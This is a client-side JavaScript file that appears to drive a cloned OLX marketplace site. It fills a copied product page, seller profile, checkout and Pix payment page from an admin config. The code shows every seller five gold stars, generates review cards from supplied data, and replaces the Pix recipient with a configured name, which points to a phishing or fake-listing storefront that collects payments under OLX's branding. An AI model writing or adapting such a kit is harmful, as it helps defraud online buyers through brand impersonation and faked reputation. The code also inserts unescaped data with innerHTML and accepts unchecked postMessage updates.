// Client-side dynamic updater for OLX clone based on config.json
(function() {
  function getStarSvg(size) {
    const s = size || 16;
    return `<svg width="${s}" height="${s}" viewBox="0 0 22 22" fill="#F59E0B" xmlns="http://www.w3.org/2000/svg">
      <path fill-rule="evenodd" clip-rule="evenodd" d="M7.32864 6.99126L10.3119 0.975544C10.5934 0.407892 11.4066 0.407892 11.6881 0.975544L14.6714 6.99126L21.3428 7.96186C21.972 8.0534 22.2227 8.82322 21.7672 9.26483L16.9405 13.9443L18.0796 20.5552C18.1871 21.1792 17.529 21.655 16.9661 21.3603L11 18.2374L5.03394 21.3603C4.47096 21.655 3.81289 21.1792 3.92042 20.5552L5.05954 13.9443L0.23279 9.26483C-0.222724 8.82322 0.0280444 8.0534 0.657233 7.96186L7.32864 6.99126Z"></path>
    </svg>`;
  }

  function getStarsRow(count, size) {
    let html = '';
    const total = Math.min(5, Math.max(1, count || 5));
    for (let i = 0; i < total; i++) {
      html += getStarSvg(size);
    }
    return html;
  }

  function applyData(data) {
    if (!data || !data.product) return;
    const p = data.product;
    const s = data.seller;
    const c = data.checkout;

    const path = window.location.pathname;

    // ----------------------------------------------------
    // 1. PRODUCT PAGE (PC & MOBILE: index.html / iphone-17-branco-olx.html / mobile.html / /)
    // ----------------------------------------------------
    if (path === '/' || path.includes('iphone-17-branco-olx.html') || path === '/index.html' || path.includes('mobile.html') || path === '') {
        // Title
        if (p.title) {
          document.title = p.title + ' | OLX';
          
          // OLX adview title element (Desktop and Mobile)
          document.querySelectorAll('h1, h1#description-title, [data-section="title"] *').forEach(el => {
            el.textContent = p.title;
          });
          // Desktop specific title row (don't overwrite section headers on mobile)
          if (!path.includes('mobile.html')) {
            document.querySelectorAll('.advc-adview-section__title').forEach(el => {
              if (el.id === 'description-title' || el.closest('[data-section="title"]')) {
                el.textContent = p.title;
              }
            });
          }

          // Meta tags & open graph
          const ogTitle = document.querySelector('meta[property="og:title"]');
          if (ogTitle) ogTitle.content = p.title;
        }

        // Current Price (Pix / à vista) - Desktop & Mobile
        if (p.price) {
          const formattedPrice = p.price.startsWith('R$') ? p.price : 'R$ ' + p.price;

          document.querySelectorAll('.typo-title-large, .typo-display-large, .olx-text--price, [data-testid="ad-price"], .ad__sc-12l0m84-0').forEach(el => {
            el.textContent = formattedPrice;
          });

          // Fallback exact match text replace
          document.querySelectorAll('span').forEach(el => {
            if (el.children.length === 0) {
              const txt = el.textContent.trim();
              if (txt === 'R$ 4.350' || txt === 'R$ 4.450' || txt === '4.450' || txt === '4.350' || txt === 'R$ 6.499' || txt === '6.499' || txt === 'R$ 800' || txt === '800') {
                el.textContent = formattedPrice;
              }
            }
          });
        }

        // Old Price (Riscado) - Desktop & Mobile
        if (p.oldPrice) {
          const formattedOld = p.oldPrice.startsWith('R$') ? p.oldPrice : 'R$ ' + p.oldPrice;
          document.querySelectorAll('span[style*="line-through"]').forEach(el => {
            el.textContent = formattedOld;
          });
        }

        // Installments - Desktop & Mobile
        if (p.installments) {
          document.querySelectorAll('.olx-core-badge--rectangle, p.font-semibold.typo-body-small, span, div').forEach(el => {
            if (el.children.length === 0 && (el.textContent.includes('sem juros') || el.textContent.includes('10x') || el.textContent.includes('12x'))) {
              el.textContent = p.installments;
            }
          });
        }

        // Description - Desktop & Mobile
        if (p.description) {
          const descSpan = document.querySelector('.advc-ad-description span.typo-body-medium, .advc-ad-description__lines > .typo-body-medium');
          if (descSpan) {
            descSpan.textContent = p.description;
          }
        }

        // Location - Desktop & Mobile
        if (p.location) {
          document.querySelectorAll('.advc-mini-profile__location, .typo-body-small.text-neutral-120.font-regular').forEach(el => {
            el.textContent = p.location;
          });
          // Mobile location section
          const mobLocCity = document.querySelector('.advc-location span.typo-body-medium');
          if (mobLocCity) mobLocCity.textContent = p.location.split(',')[0].trim();
          const mobLocState = document.querySelector('.advc-location span.typo-body-small');
          if (mobLocState) mobLocState.textContent = p.location;

          document.querySelectorAll('span').forEach(el => {
            if (el.children.length === 0 && (el.textContent === 'Vila Guilherme, São Paulo - SP' || el.textContent === 'Vila Guilherme' || el.textContent === 'Nova Gerty')) {
              el.textContent = p.location;
            }
          });
        }

        // Product Details / Characteristics Section (PC & Mobile)
        const d = p.details || {
          brand: p.brand || 'Brastemp',
          model: p.model || 'Ative Inox Duplex Frost Free',
          condition: p.condition || 'Usado - Excelente',
          color: p.color || 'Inox',
          storage: p.storage || '',
          extra: p.extra || '',
          acceptTrades: p.acceptTrades || 'Não'
        };

        document.querySelectorAll('.advc-detail-item').forEach(item => {
          const titleEl = item.querySelector('.advc-detail-item__title');
          if (!titleEl) return;
          const title = titleEl.textContent.trim().toLowerCase();
          const valEl = item.querySelector('.advc-see-more-text, a, span:not(.advc-detail-item__title)');
          if (!valEl) return;

          function setVal(text) {
            if (valEl.childNodes && valEl.childNodes.length > 0 && valEl.childNodes[0].nodeType === 3) {
              valEl.childNodes[0].nodeValue = text;
            } else {
              valEl.textContent = text;
            }
          }

          if (title === 'categoria') {
            if (p.category) {
              item.style.display = '';
              setVal(p.category);
            }
          } else if (title === 'marca') {
            if (d.brand) {
              item.style.display = '';
              setVal(d.brand);
            }
          } else if (title === 'modelo') {
            if (d.model) {
              item.style.display = '';
              setVal(d.model);
            }
          } else if (title === 'condição' || title === 'condicao') {
            const cond = d.condition || p.condition || 'Usado - Excelente';
            item.style.display = '';
            setVal(cond);
          } else if (title === 'cor') {
            if (d.color) {
              item.style.display = '';
              setVal(d.color);
            } else {
              item.style.display = 'none';
            }
          } else if (title.includes('memória') || title.includes('memoria') || title.includes('capacidade') || title.includes('litros')) {
            if (d.storage) {
              item.style.display = '';
              setVal(d.storage);
            } else {
              item.style.display = 'none';
            }
          } else if (title.includes('saúde') || title.includes('saude') || title.includes('bateria') || title.includes('detalhe') || title.includes('extra')) {
            if (d.extra) {
              item.style.display = '';
              setVal(d.extra);
            } else {
              item.style.display = 'none';
            }
          } else if (title.includes('troca')) {
            if (d.acceptTrades) {
              item.style.display = '';
              setVal(d.acceptTrades);
            }
          }
        });

        // Category Breadcrumb
        if (p.category) {
          const breadcrumbItems = document.querySelectorAll('.olx-core-breadcrumb__list .olx-core-breadcrumb__element a');
          if (breadcrumbItems && breadcrumbItems.length >= 3) {
            breadcrumbItems[2].textContent = p.category;
          }
        }

        // Product Images Gallery (PC & Mobile)
        if (p.images && p.images.length > 0) {
          const galleryImgs = document.querySelectorAll('.advc-gallery__image-wrap img, .advc-gallery__item img, picture.advc-gallery__image-wrap img');
          p.images.forEach((url, idx) => {
            if (galleryImgs[idx]) {
              galleryImgs[idx].src = url;
            }
          });

          // Lightbox modal integration
          if (typeof window.updateOlxLightboxPhotos === 'function') {
            window.updateOlxLightboxPhotos(p.images);
          } else if (Array.isArray(window.photos)) {
            window.photos = p.images.map((url, i) => ({
              url: url,
              fallback: url,
              alt: (p.title || 'Foto') + ' - Imagem ' + (i + 1)
            }));
          }
        }

        // Seller on Product Page (PC & Mobile)
        if (s && s.name) {
          document.querySelectorAll('.advc-mini-profile__name, [data-ds-component="DS-SellerName"]').forEach(el => {
            el.textContent = s.name;
          });
        }

        // Render golden stars in Seller History
        const sellerStarsWrap = document.querySelector('.advc-seller-history__stars');
        if (sellerStarsWrap) {
          sellerStarsWrap.innerHTML = getStarsRow(5, 17);
          sellerStarsWrap.style.display = 'inline-flex';
          sellerStarsWrap.style.gap = '3px';
          sellerStarsWrap.style.alignItems = 'center';
        }

        if (s && s.ratingScore) {
          const sellerHistScore = document.querySelector('.advc-seller-history .typo-body-large');
          if (sellerHistScore) {
            sellerHistScore.textContent = s.ratingScore.replace('.', ',');
          }
        }

        const totalRev = (s && s.reviews && s.reviews.length) || 6;
        document.querySelectorAll('.advc-seller-history *').forEach(el => {
          if (el.children.length === 0 && el.textContent.includes('avaliações')) {
            el.textContent = `(${totalRev} avaliações)`;
          }
        });

        // Seller Last access on mobile
        if (s && s.lastAccess) {
          document.querySelectorAll('.advc-mini-profile__status span, .advc-mini-profile__activity-meta span').forEach(el => {
            if (el.textContent.includes('Último acesso') || el.textContent.includes('acesso')) {
              el.textContent = s.lastAccess;
            }
          });
        }

        // Seller Avatar (PC & Mobile)
        if (s && s.avatar) {
          document.querySelectorAll('.advc-mini-profile__avatar, .advc-mini-profile img, .advc-mini-profile__profile img, img[alt*="Foto de"]').forEach(el => {
            if (!el.classList.contains('advc-seller-history__star') && !el.closest('.advc-seller-history__stars')) {
              el.src = s.avatar;
              if (s.name) el.alt = 'Foto de ' + s.name;
            }
          });
        }
      }

      // ----------------------------------------------------
      // 2. PROFILE PAGE (/perfil)
      // ----------------------------------------------------
      if (path.startsWith('/perfil')) {
        if (s && s.name) {
          document.title = s.name + ' | Perfil do anunciante - OLX';
          document.querySelectorAll('.typo-body-large.font-semibold, p.typo-body-large').forEach(el => {
            if (el.textContent.includes('Navarro') || el.textContent === 'William Navarro' || el.classList.contains('text-neutral-130')) {
              el.textContent = s.name;
            }
          });
        }

        if (s && s.avatar) {
          const avatarImg = document.querySelector('[data-testid="avatar-seller"] img, .sc-cbe5f5f1-0 img');
          if (avatarImg) avatarImg.src = s.avatar;
        }

        if (s && s.lastAccess) {
          const accessEl = document.querySelector('.sc-4ab85633-1');
          if (accessEl) accessEl.textContent = s.lastAccess;
        }

        if (s && s.memberSince) {
          document.querySelectorAll('.sc-f92f1d1e-2').forEach(el => {
            if (el.textContent.includes('Na OLX desde')) {
              el.textContent = 'Na OLX desde ' + s.memberSince;
            }
          });
        }

        if (s && s.location) {
          document.querySelectorAll('.sc-f92f1d1e-2').forEach(el => {
            if (el.textContent.includes('Vila Guilherme') || el.textContent.includes('São Paulo')) {
              el.textContent = s.location;
            }
          });
        }

        if (s && s.stats) {
          const cards = document.querySelectorAll('[data-testid="ads-history-card"]');
          if (cards[0] && s.stats.ads) {
            const num = cards[0].querySelector('.sc-ffda45a8-1');
            if (num) num.childNodes[0].nodeValue = s.stats.ads;
          }
          if (cards[1] && s.stats.sales) {
            const num = cards[1].querySelector('.sc-ffda45a8-1');
            if (num) num.childNodes[0].nodeValue = s.stats.sales;
          }
          if (cards[2] && s.stats.dispatchTime) {
            const num = cards[2].querySelector('.sc-ffda45a8-1');
            if (num) num.childNodes[0].nodeValue = s.stats.dispatchTime.replace('horas', '').trim();
          }
        }

        if (s && s.ratingScore) {
          const ratingScoreEl = document.querySelector('.sc-42545084-0');
          if (ratingScoreEl) ratingScoreEl.textContent = s.ratingScore;
        }

        const totalReviewsCount = (s && s.reviews && s.reviews.length) || 6;
        document.querySelectorAll('p.typo-body-small.text-neutral-130').forEach(el => {
          if (el.textContent.includes('avaliações recebidas')) {
            el.textContent = (s && s.totalReviewsText) || (totalReviewsCount + ' avaliações recebidas');
          }
        });

        const showAllLink = document.querySelector('.sc-82307d60-0');
        if (showAllLink) {
          showAllLink.textContent = `Exibir todas as avaliações (${totalReviewsCount})`;
        }

        if (s && Array.isArray(s.reviews) && s.reviews.length > 0) {
          const carousel = document.querySelector('[data-testid="ratings-carousel"]');
          if (carousel) {
            carousel.innerHTML = '';
            s.reviews.forEach(rev => {
              const card = document.createElement('div');
              card.className = 'sc-33a130bb-1 gUZdrD';
              
              const avatarSrc = rev.avatar || '/images/perfil/avatar-user.png';
              const name = rev.name || 'Cliente';
              const memberSince = rev.memberSince ? `Na OLX desde ${rev.memberSince}` : 'Comprador verificado';
              const stars = rev.stars || 5;
              const titleOrItem = rev.item || rev.comment || 'Produto entregue com sucesso';
              const dateText = rev.date ? (rev.date.startsWith('Avaliado em') ? rev.date : `Avaliado em ${rev.date}`) : 'Avaliado recentemente';
              
              card.innerHTML = `
                <div class="sc-33a130bb-5 JgeoA">
                  <img alt="${name}" aria-hidden="true" loading="lazy" width="40" height="40" src="${avatarSrc}" style="color: transparent; object-fit: cover; border-radius: 50%;">
                  <div class="flex flex-col">
                    <p class="typo-body-small font-semibold text-neutral-130">${name}</p>
                    <p class="typo-caption text-neutral-120">${memberSince}</p>
                  </div>
                </div>
                <div class="flex">
                  <div class="flex gap-0-5" role="button" tabindex="0" data-testid="stars-container">
                    ${getStarsRow(stars, 16)}
                  </div>
                </div>
                <div class="flex flex-col gap-0-5">
                  <p class="sc-33a130bb-2 eWBvni">${titleOrItem}</p>
                  ${rev.comment && rev.item ? `<p class="typo-caption text-neutral-120" style="margin-top:2px;">"${rev.comment}"</p>` : ''}
                </div>
                <div class="flex flex-1 items-end">
                  <p class="typo-caption text-neutral-110">${dateText}</p>
                </div>
              `;
              carousel.appendChild(card);
            });
          }
        }

        if (p && p.title) {
          const adTitle = document.querySelector('.olx-ad-card__title, #ds-ad-card-title-13 h2');
          if (adTitle) adTitle.textContent = p.title;
        }
        if (p && p.price) {
          const adPrice = document.querySelector('.olx-ad-card__price');
          if (adPrice) adPrice.textContent = p.price.startsWith('R$') ? p.price : 'R$ ' + p.price;
        }
        if (p && p.images && p.images[0]) {
          const firstAdImg = document.querySelector('.olx-ad-card img');
          if (firstAdImg) firstAdImg.src = p.images[0];
        }
      }

      // Persist product price from admin config for checkout & Pix generation
      let productPriceNum = 4450.00;
      if (p && p.priceCents && !isNaN(parseFloat(p.priceCents))) {
        productPriceNum = parseFloat(p.priceCents);
      } else if (p && p.price) {
        const cleaned = String(p.price).replace(/[^0-9,.]/g, '').replace(/\./g, '').replace(',', '.');
        if (!isNaN(parseFloat(cleaned))) productPriceNum = parseFloat(cleaned);
      }
      try {
        localStorage.setItem('olx_price', productPriceNum.toFixed(2));
        if (p && p.title) localStorage.setItem('olx_product_title', p.title);
      } catch (e) {}

      function fmtCurrencyBRL(num) {
        return 'R$ ' + Number(num).toFixed(2).replace('.', ',').replace(/\B(?=(\d{3})+(?!\d))/g, '.');
      }

      // ----------------------------------------------------
      // 3. CHECKOUT PAGE (/checkout)
      // ----------------------------------------------------
      if (path.startsWith('/checkout')) {
        if (p && p.title) {
          const fig = document.querySelector('figcaption');
          if (fig) fig.textContent = p.title;
        }
        if (p && p.images && p.images[0]) {
          const thumb = document.querySelector('figure img');
          if (thumb) thumb.src = p.images[0];
        }
        if (s && s.name) {
          document.querySelectorAll('*').forEach(el => {
            if (el.children.length === 0 && el.textContent.includes('WILLIAM N')) {
              el.textContent = s.name.toUpperCase();
            }
          });
        }

        const formattedProdPrice = fmtCurrencyBRL(productPriceNum);
        document.querySelectorAll('*').forEach(el => {
          if (el.children.length === 0) {
            const txt = el.textContent.trim();
            if (txt === 'R$ 4.450,00' || txt === 'R$ 4.350,00' || txt === 'R$ 4.622,99' || txt === 'R$ 4.650,13') {
              el.textContent = formattedProdPrice;
            }
          }
        });

        const modalPixTotal = document.getElementById('modal-pix-total');
        if (modalPixTotal) modalPixTotal.textContent = formattedProdPrice;
        const modalTotalFinal = document.getElementById('modal-total-final');
        if (modalTotalFinal) modalTotalFinal.textContent = formattedProdPrice;
      }

      // ----------------------------------------------------
      // 4. PIX PAGE (/pix)
      // ----------------------------------------------------
      if (path.startsWith('/pix')) {
        const amtEl = document.getElementById('olx-pix-amount-val');
        if (amtEl) {
          amtEl.textContent = fmtCurrencyBRL(productPriceNum);
        }

        if (c && c.recipient) {
          document.querySelectorAll('*').forEach(el => {
            if (el.children.length === 0 && (el.textContent === 'Pagar Me Pagamentos' || el.textContent === 'PROMISTIC MARKETPLACE LTDA')) {
              el.textContent = c.recipient;
            }
          });
        }
      }

  }

  async function applyAdminConfig() {
    try {
      const isDraft = window.location.search.includes('preview') || window.location.search.includes('draft');
      if (isDraft) {
        try {
          const draftLocal = localStorage.getItem('olx_draft_config');
          if (draftLocal) applyData(JSON.parse(draftLocal));
        } catch(e) {}
      } else {
        if (window.__INITIAL_OLX_CONFIG__) {
          applyData(window.__INITIAL_OLX_CONFIG__);
        }
        try {
          const liveLocal = localStorage.getItem('olx_live_config');
          if (liveLocal) applyData(JSON.parse(liveLocal));
        } catch(e) {}
      }

      const res = await fetch('/api/admin/data?' + (isDraft ? 'draft=1&' : '') + 't=' + Date.now());
      if (!res.ok) return;
      const data = await res.json();
      applyData(data);
    } catch (e) {
      console.error('[ConfigSync Error]', e);
    }
  }

  if (window.location.search.includes('preview') || window.location.search.includes('draft')) {
    try {
      const draftLocal = localStorage.getItem('olx_draft_config');
      if (draftLocal) applyData(JSON.parse(draftLocal));
    } catch(e) {}
  } else if (window.__INITIAL_OLX_CONFIG__) {
    applyData(window.__INITIAL_OLX_CONFIG__);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', applyAdminConfig);
  } else {
    applyAdminConfig();
  }

  setTimeout(applyAdminConfig, 100);
  setTimeout(applyAdminConfig, 400);

  window.addEventListener('message', function(event) {
    if (event.data && event.data.type === 'OLX_CONFIG_UPDATE') {
      if (event.data.config) {
        applyData(event.data.config);
      } else {
        applyAdminConfig();
      }
    }
  });
})();
